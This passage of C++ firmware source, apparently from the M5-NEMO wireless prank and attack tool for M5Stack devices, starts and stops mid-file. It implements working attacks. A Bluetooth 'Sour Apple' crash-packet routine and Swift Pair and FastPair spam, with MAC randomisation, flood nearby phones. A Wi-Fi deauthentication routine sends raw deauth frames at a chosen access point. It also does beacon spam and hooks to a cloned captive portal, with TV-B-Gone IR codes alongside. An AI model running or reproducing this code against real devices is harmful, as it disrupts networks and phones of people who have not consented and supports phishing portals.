    if (region == NA) {
      powerCode = NApowerCodes[i];
    }
    else if (region == EU) {
      powerCode = EUpowerCodes[i];
    }
    else {
      powerCode = CUSTOMpowerCodes[i];
    }
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(0, 0);
    DISP.println("TV-B-Gone");
    DISP.setTextSize(SMALL_TEXT);
    DISP.println(TXT_FK_GP);
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti;
      ti = (read_bits(bitcompression)) * 2;
      #if defined(ACTIVE_LOW_IR)
        offtime = powerCode->times[ti];  // read word 1 - ontime
        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
      #else
        ontime = powerCode->times[ti];  // read word 1 - ontime
        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
      #endif
      DISP.setTextSize(TINY_TEXT);
      DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      Serial.printf("TVBG: rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10;
      rawData[(k * 2) + 1] = ontime * 10;
    }
    irsend.sendRaw(rawData, (numpairs * 2) , freq);
    digitalWrite(IRLED, M5LED_OFF);
    bitsleft_r = 0;
    delay_ten_us(20500);
    #if defined(AXP)
    if (M5.Axp.GetBtnPress()) {
      endingEarly = true;
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      break;     
    }
    #endif
#if defined(KB)
#endif
    if (check_select_press()){
      Serial.println("endingearly");
      endingEarly = true;
      delay(250);
      break; 
    }
  } 
  if (endingEarly == false)
  {
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    quickflashLEDx(8);
  }
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_SEL_GO_PAUSE);
  DISP.println(TXT_SEL_EXIT);
}

/// CLOCK ///
/// TIMESET ///

#if defined(RTC)
  void clock_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(1);
  }

  void clock_loop() {
    DISP.setCursor(10, 40, 7);
    #if defined(STICK_C_PLUS2)
      auto dt = StickCP2.Rtc.getDateTime();
      DISP.printf("%02d:%02d:%02d\n", dt.time.hours, dt.time.minutes, dt.time.seconds);
    #else
      M5.Rtc.GetBm8563Time();
      DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    #endif
    check_select_press();
  }

  /// TIME SETTING ///
  void timeset_setup() {
    rstOverride = true;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(TXT_SET_HOUR);
    delay(2000);
  }

  void timeset_loop() {
  #if defined(STICK_C_PLUS2)
    auto dt = StickCP2.Rtc.getDateTime();
    cursor = dt.time.hours;
  #else
    M5.Rtc.GetBm8563Time();
    cursor = M5.Rtc.Hour;
  #endif
    number_drawmenu(24);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 24 ;
        number_drawmenu(24);
        delay(100);
      }
    }
    int hour = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(TXT_SET_MIN);
    delay(2000);
    #if defined(STICK_C_PLUS2)
      cursor = dt.time.minutes;
    #else
      cursor = M5.Rtc.Minute;
    #endif
    number_drawmenu(60);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 60 ;
        number_drawmenu(60);
        delay(100);
      }
    }
    int minute = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    #if defined(STICK_C_PLUS2)
       StickCP2.Rtc.setDateTime( { { dt.date.year, dt.date.month, dt.date.date }, { hour, minute, 0 } } );
    #else
      RTC_TimeTypeDef TimeStruct;
      TimeStruct.Hours   = hour;
      TimeStruct.Minutes = minute;
      TimeStruct.Seconds = 0;
      M5.Rtc.SetTime(&TimeStruct);
    #endif
    DISP.printf("Setting Time:\n%02d:%02d:00",hour,minute);
    delay(2000);
    rstOverride = false;
    isSwitching = true;
    current_proc = 0;
  }
#endif // RTC

/// Bluetooth Spamming ///
/// BTSPAM MENU ///
MENU btmenu[] = {
  { TXT_BACK, 5},
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "Android Spam", 4},
  { TXT_SA_CRASH, 2},
  { "BT Maelstrom", 3},
};
int btmenu_size = sizeof(btmenu) / sizeof (MENU);

void btmenu_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawmenu(btmenu, btmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % btmenu_size;
    drawmenu(btmenu, btmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-12s\n", TXT_BT_SPAM);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.print(TXT_ADV);

    switch(option) {
      case 0:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 8;
        break;
      case 1:
        swiftPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SP_RND);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 2:
        sourApple = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SA_CRASH);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17; // Maelstrom
        DISP.print("Bluetooth Maelstrom\n");
        DISP.print(TXT_CMB_BT_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 4:
        androidPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_AD_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;

      case 5:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
  }
}

void random_MAC(){
  uint8_t tempMAC[ESP_BD_ADDR_LEN];
      
  // Keep ESP Manufactorer ID 
  tempMAC[0] = 0x02;
  tempMAC[1] = 0xE5;

  // Generate random values for the MAC address and add them to the ESP ID
  uint32_t randomBytes = esp_random();
  memcpy(&tempMAC[2], &randomBytes, 4);

  // Set new MAC address
  esp_base_mac_addr_set(tempMAC);
}

MENU ajmenu[] = {
  { TXT_BACK, 30},
  { "AirPods", 1},
  { TXT_AJ_TRANSF_NM, 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "Apple Vision Pro", 29},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { TXT_AJ_TV_COLOR, 26},
  { TXT_STP_NW_PH, 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(" AppleJuice  ");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ajmenu_size;
      drawmenu(ajmenu, ajmenu_size);
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      random_MAC();
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        data = AppleVisionPro;
        break;
      case 30:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.println(" AppleJuice  ");
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      DISP.print(TXT_ADV);
      DISP.print(ajmenu[cursor].name);
      DISP.print(TXT_SEL_EXIT2);
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print(TXT_SA_ADV);
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf(TXT_SP_ADV, display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print(TXT_AD_SPAM_ADV);
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(std::string((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print(TXT_AJ_ADV);
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
    delay(10);
    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
#endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      current_proc = 16;
      drawmenu(btmenu, btmenu_size);
    } else {
      isSwitching = true;
      current_proc = 8;      
      drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

/// CREDITS ///
void credits_setup(){
  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 22, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 10);
  DISP.print(" M5-NEMO\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",NEMO_VERSION);
  DISP.println(" For M5Stack");
  DISP.printf(" %s\n\n", platformName);
  DISP.println("Contributors:");
  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 17);
  DISP.println("Source:");
  delay(250);
  cursor = 0;
  advtime = 0;
}

void credits_loop(){
  if(millis() > advtime){
    DISP.setTextColor(BLACK, WHITE);  
    DISP.setCursor(0, 115);
    DISP.println("                   ");
    DISP.setCursor(0, 115);
    DISP.println(contributors[cursor]);
    cursor++;  
    cursor = cursor % (sizeof(contributors)/sizeof(contributors[0]));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    advtime=millis() + 2000;
  }
}

/// WiFiSPAM ///
void wifispam_setup() {
  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // for random generator
  randomSeed(1);

  // set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SP);
  delay(1000);
  DISP.setTextSize(TINY_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.print(TXT_WF_SP);
    int ct = 0;
    const char *str;
    switch(spamtype) {
    case 1:
      for(str = funnyssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(funnyssids);
      break;
    case 2:
      for(str = rickrollssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(rickrollssids);
      break;
    case 3:
      DISP.printf(TXT_RND_SSID, ct);
      break;
  }
  DISP.setTextSize(SMALL_TEXT);
  current_proc = 11;
}

void wifispam_loop() {
  int i = 0;
  int len = 0;
#if defined(M5LED)
  digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
  delay(1);
  digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
#endif
  switch(spamtype) {
    case 1:
      len = sizeof(funnyssids);
      while(i < len){
        i++;
      }
      beaconSpamList(funnyssids);
      break;
    case 2:
      len = sizeof(rickrollssids);
      while(i < len){
        i++;
      }
      beaconSpamList(rickrollssids);
      break;
    case 3:
      char* randoms = randomSSID();
      len = sizeof(randoms);
      while(i < len){
        i++;
      }
      beaconSpamList(randoms);
      break;
  }
}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

/// WIFI MENU ///
MENU wsmenu[] = {
  { TXT_BACK, 5},
  { TXT_WF_SCAN, 0},
  { TXT_WF_SPAM_FUN, 1},
  { TXT_WF_SPAM_RR, 2},
  { TXT_WF_SPAM_RND, 3},
  { "NEMO Portal", 4},
};
int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);

void wsmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(wsmenu, wsmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void wsmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % wsmenu_size;
    drawmenu(wsmenu, wsmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = wsmenu[cursor].command;
    rstOverride = false;
    current_proc = 11;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 14;
        break;
      case 1:
        spamtype = 1;
        break;
      case 2:
        spamtype = 2;
        break;
      case 3:
        spamtype = 3;
        break;
      case 4:
        current_proc = 19;
        break;
      case 5:
        current_proc = 1;
        break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.print(" ");
      DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
  if(cursor == wifict){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(TXT_WF_RESCAN);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  if(cursor == wifict + 1){
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(String(TXT_BACK));
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void wscan_result_setup() {
  cursor = 0;
  rstOverride = true;
  wscan_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void wscan_result_loop(){
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wscan_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 14;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 12;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = TXT_WF_OPEN;
      break ;
    }
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    if(WiFi.SSID(cursor).length() > 12){
      DISP.setTextSize(SMALL_TEXT);
    }else if(WiFi.SSID(cursor).length() > 20){
      DISP.setTextSize(TINY_TEXT);
    }else{
      DISP.setTextSize(MEDIUM_TEXT);
    }
    DISP.println(WiFi.SSID(cursor));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.printf(TXT_WF_CHANN, WiFi.channel(cursor));
    DISP.printf(TXT_WF_CRYPT, encryptType);
    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
    DISP.printf(TXT_SEL_BACK);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-19s\n", TXT_HOLD_ATTACK);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
   if(check_select_press()){
      apMac=WiFi.BSSIDstr(cursor);
      apSsidName=WiFi.SSID(cursor);
      channel = static_cast<uint8_t>(WiFi.channel(cursor));                            // DEAUTH - save channel
      uint8_t* bssid = WiFi.BSSID(cursor);                                             // DEAUTH - save BSSID (AP MAC)
      memcpy(ap_record.bssid, bssid, 6);                                               // DEAUTH - cpy bssid to memory
      rstOverride = false;
      current_proc = 20;
      isSwitching = true;
      delay(100);
    }
  }
}

void wscan_setup(){
  rstOverride = false;  
  cursor = 0;
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCN);
  delay(2000);
}

void wscan_loop(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCNING);
  wifict = WiFi.scanNetworks();
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(0, 0);
  if(wifict > 0){
    isSwitching = true;
    current_proc=15;
  }
}
/// WIFI-Attack MENU and functions START///
MENU wsAmenu[] = {
  { TXT_BACK, 5},
  { TXT_WFA_PORTAL, 0},
  #if defined(DEAUTHER)
    { TXT_WFA_DEAUTH, 1},
    { TXT_WFA_COMBINED, 2},
  #endif
};
int wsAmenu_size = sizeof(wsAmenu) / sizeof (MENU);

void wsAmenu_setup() {
  rstOverride = true;
  drawmenu(wsAmenu, wsAmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void wsAmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % wsAmenu_size;
    drawmenu(wsAmenu, wsAmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = wsAmenu[cursor].command;
    rstOverride = false;
    current_proc = 20;
    isSwitching = true;
    switch(option) {
      case 0:                     //Go to Clone Nemo Portal
        rstOverride = false;
        isSwitching = true;
        clone_flg=true;
        target_deauth_flg=false;
        current_proc = 19;
        break;
      #if defined (DEAUTHER)
        case 1:                     //Go to Deauth
          rstOverride = false;
          isSwitching = true;
          target_deauth_flg=false;
          target_deauth=true;
          current_proc = 21;                                                                 // iserir codigo do deauth aqui
          break;
        case 2:                     //Go to Nemo with Deauth
          rstOverride = false;
          isSwitching = true;
          clone_flg=true;
          target_deauth_flg=true;
          target_deauth=true;
          current_proc = 19;
          break;
      #endif
      case 5:                     //Exit
        current_proc = 14;
        break;
    }
  }
}

// WIFI-Attack MENU and functions END
// DEAUTH ATTACK START
#if defined(DEAUTHER)
  void deauth_setup(){
    // Start the Access point service as Hidden
    WiFi.mode(WIFI_AP);
    WiFi.softAP(apSsidName, emptyString, channel, 1, 4, false);
    IPAddress apIP = WiFi.softAPIP();


    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextSize(BIG_TEXT);
    DISP.setTextColor(TFT_RED, BGCOLOR);
    DISP.println("Deauth Atk");
    DISP.setTextSize(SMALL_TEXT);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.print("\nSSID: " + apSsidName);
    DISP.print("\n");
    DISP.printf(TXT_WF_CHANN, channel);
    DISP.print("> " + apMac);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_deauth_frame(&ap_record, channel);                                        // DEAUTH CREATE FRAME

    cursor = 0;
    rstOverride = false;
    delay(500); // Prevent switching after menu loads up
  }
  void deauth_loop(){

    if (target_deauth == true) {                                                                 // DEAUTH
      wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                   // DEAUTH SEND FRAME
      DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
      DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
      DISP.setCursor(1, 115);                                                                    // DEAUTH
      DISP.println(TXT_DEAUTH_STOP);                                                             // DEAUTH
      DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
    } else{                                                                                      // DEAUTH
      DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
      DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
      DISP.setCursor(1, 115);                                                                    // DEAUTH
      DISP.println(TXT_DEAUTH_START);                                                            // DEAUTH
      DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
    }                                                                                            // DEAUTH

    delay(100); //from 200

    if (check_select_press()){                                                                    // DEAUTH
      target_deauth = !target_deauth;                                                             // DEAUTH
      DISP.setCursor(1, 115);                                                                     // DEAUTH
      DISP.println("......................");                                                     // DEAUTH
      delay(500);                                                                                 // DEAUTH
    }                                                                                             // DEAUTH

    if (check_next_press()){
      WiFi.mode(WIFI_MODE_STA);
      rstOverride = false;
      isSwitching = true;
      target_deauth = false;                                                                      // DEAUTH
      current_proc = 12;
      delay(500);
    }
  }
  // DEAUTH attack END
#endif
void bootScreen(){
  // Boot Screen
  #ifdef SONG
  setupSongs();
  #endif
  #ifndef STICK_C
  BITMAP;
  delay(3000);
  #endif
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setCursor(10, 30);
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("%s-%s\n",NEMO_VERSION,platformName);
#if defined(CARDPUTER)
  DISP.println(TXT_INST_NXT);
  DISP.println(TXT_INST_PRV);
  DISP.println(TXT_INST_SEL);
  DISP.println(TXT_INST_HOME);
  delay(1500);
  DISP.println(TXT_INST_PRSS_KEY);
  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      drawmenu(mmenu, mmenu_size);
      delay(250);
      break;
    }
  }
#else
  DISP.println(TXT_STK_NXT);
  DISP.println(TXT_STK_SEL);
  DISP.println(TXT_STK_HOME);
  delay(3000);
#endif
}

void qrmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(qrcodes) / sizeof(QRCODE) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(qrcodes[i].name);
  }
}

void qrmenu_setup() {
  cursor = 0;
  rstOverride = true;
  qrmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void qrmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(qrcodes) / sizeof(QRCODE) );
    qrmenu_drawmenu();
    activeQR = false;
    delay(250);
  }
  if (check_select_press()) {
    if (qrcodes[cursor].url.length() < 1){
